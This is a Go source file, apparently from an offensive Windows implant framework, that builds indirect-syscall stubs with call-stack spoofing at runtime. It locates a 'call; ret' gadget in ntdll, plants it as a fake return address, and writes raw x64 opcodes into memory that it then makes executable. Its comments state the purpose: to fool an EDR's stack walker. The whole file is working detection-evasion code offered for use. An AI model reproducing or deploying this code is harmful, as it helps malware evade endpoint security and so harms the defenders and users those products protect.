//go:build windows && amd64

package win

import (
	"encoding/binary"
	"sync"
	"unsafe"
)

// L7 call-stack spoofing: a runtime-built 110-byte stub that plants a
// "call rel32; ret" gadget address inside ntdll on the stack before the
// syscall, so an EDR's stack walker sees the return chain as:
//
//	ntdll!NtXxx        ← syscall executes here (via the syscall;ret gadget)
//	ntdll!+offset      ← call-preceded RET (spoofed return address)
//	<something benign> ← real return chain
//
// Layout of the 110-byte stub (Windows x64 ABI, called like a normal export):
//
//	+0    48 83 EC 08            sub  rsp, 8
//	+4    [7 × mov r11,[rsp+s]; mov [rsp+d],r11]   shift stack args 5..11
//	+74   49 BB <8B spoof_addr>  mov  r11, spoof_addr
//	+84   4C 89 1C 24            mov  [rsp], r11
//	+88   4C 8B D1               mov  r10, rcx
//	+91   B8 <4B SSN>            mov  eax, SSN
//	+96   FF 25 00 00 00 00      jmp  [rip+0]
//	+102  <8B ntdll syscall;ret gadget address>
const spoofedStubSize = 110

var (
	spoofPageMu   sync.Mutex
	spoofPageBase uintptr
	spoofPageOff  uintptr
	spoofStubCache = map[uint32]uintptr{}
	spoofGadgetOnce sync.Once
	spoofGadgetVal  uintptr
)

// spoofGadget finds a "call rel32; ret" (E8 xx xx xx xx C3) inside ntdll .text.
// The address of the C3 byte is what we plant; the stack walker reads the
// preceding E8 and concludes this is a valid call-site return address.
func spoofGadget() uintptr {
	spoofGadgetOnce.Do(func() {
		ntdll := ModuleNtdll()
		if ntdll == 0 {
			return
		}
		dos := (*IMAGE_DOS_HEADER)(unsafe.Pointer(ntdll))
		nt := (*IMAGE_NT_HEADERS64)(unsafe.Pointer(ntdll + uintptr(dos.e_lfanew)))
		if nt.Signature != 0x00004550 {
			return
		}
		optSize := uintptr(nt.FileHeader.SizeOfOptionalHeader)
		sectBase := uintptr(unsafe.Pointer(nt)) + 24 + optSize
		nSect := nt.FileHeader.NumberOfSections
		for i := uintptr(0); i < uintptr(nSect); i++ {
			sh := (*IMAGE_SECTION_HEADER)(unsafe.Pointer(sectBase + i*40))
			if string(sh.Name[:4]) != ".tex" {
				continue
			}
			start := ntdll + uintptr(sh.VirtualAddress)
			vsz := int(sh.VirtualSize)
			for off := 5; off+1 <= vsz; off++ {
				if *(*byte)(unsafe.Pointer(start+uintptr(off-5))) == 0xE8 &&
					*(*byte)(unsafe.Pointer(start+uintptr(off))) == 0xC3 {
					spoofGadgetVal = start + uintptr(off)
					return
				}
			}
		}
	})
	return spoofGadgetVal
}

// initSpoofPage reserves one RW page (flipped to RX per stub) for the spoofed
// stubs. Allocates through the API path to avoid recursion into the syscall
// layer that we are busy hardening.
func initSpoofPage() {
	if spoofPageBase != 0 {
		return
	}
	base, err := AllocateVirtualMemory(InvokeAPI, 0x1000, pageReadWrite)
	if err != nil || base == 0 {
		return
	}
	spoofPageBase = base
}

// MakeSpoofedStub returns (and caches) the address of a 110-byte spoofed
// indirect syscall stub for the given SSN. Falls back to the plain indirect
// stub when the spoof gadget cannot be found.
func MakeSpoofedStub(ssn uintptr) uintptr {
	spoofPageMu.Lock()
	defer spoofPageMu.Unlock()

	key := uint32(ssn)
	if a, ok := spoofStubCache[key]; ok {
		return a
	}
	sysGadget := syscallGadgetGlobal()
	if sysGadget == 0 {
		return 0
	}
	initSpoofPage()
	if spoofPageBase == 0 {
		return 0
	}
	sg := spoofGadget()
	if sg == 0 {
		return 0
	}
	if spoofPageOff+spoofedStubSize > 0x1000 {
		return 0
	}
	addr := spoofPageBase + spoofPageOff
	spoofPageOff += spoofedStubSize

	// flip RW to write, then RX before first use
	if _, err := ProtectVirtualMemory(InvokeAPI, addr, spoofedStubSize, pageReadWrite); err != nil {
		return 0
	}
	s := unsafe.Slice((*byte)(unsafe.Pointer(addr)), spoofedStubSize)

	// +0 sub rsp, 8
	s[0] = 0x48; s[1] = 0x83; s[2] = 0xEC; s[3] = 0x08

	// +4 .. +73: shift stack args 5..11 down by 8
	// mov r11,[rsp+src] (4C 8B 5C 24 src); mov [rsp+dst],r11 (4C 89 5C 24 dst)
	argCopies := [7][2]byte{
		{0x30, 0x28}, {0x38, 0x30}, {0x40, 0x38}, {0x48, 0x40},
		{0x50, 0x48}, {0x58, 0x50}, {0x60, 0x58},
	}
	off := 4
	for _, p := range argCopies {
		s[off+0] = 0x4C; s[off+1] = 0x8B; s[off+2] = 0x5C; s[off+3] = 0x24; s[off+4] = p[0]
		s[off+5] = 0x4C; s[off+6] = 0x89; s[off+7] = 0x5C; s[off+8] = 0x24; s[off+9] = p[1]
		off += 10
	}

	// +74 mov r11, spoof_addr
	s[74] = 0x49; s[75] = 0xBB
	binary.LittleEndian.PutUint64(s[76:84], uint64(sg))
	// +84 mov [rsp], r11
	s[84] = 0x4C; s[85] = 0x89; s[86] = 0x1C; s[87] = 0x24

	// +88 mov r10, rcx
	s[88] = 0x4C; s[89] = 0x8B; s[90] = 0xD1
	// +91 mov eax, SSN
	s[91] = 0xB8
	binary.LittleEndian.PutUint32(s[92:96], uint32(ssn))
	// +96 jmp [rip+0]
	s[96] = 0xFF; s[97] = 0x25; s[98] = 0; s[99] = 0; s[100] = 0; s[101] = 0
	// +102 gadget address
	binary.LittleEndian.PutUint64(s[102:110], uint64(sysGadget))

	if _, err := ProtectVirtualMemory(InvokeAPI, addr, spoofedStubSize, pageExec); err != nil {
		return 0
	}
	spoofStubCache[key] = addr
	return addr
}

// SpoofedAvailable reports whether the spoof gadget + syscall gadget are both
// resolvable (the L7 path can be used).
func SpoofedAvailable() bool {
	return syscallGadgetGlobal() != 0 && spoofGadget() != 0
}
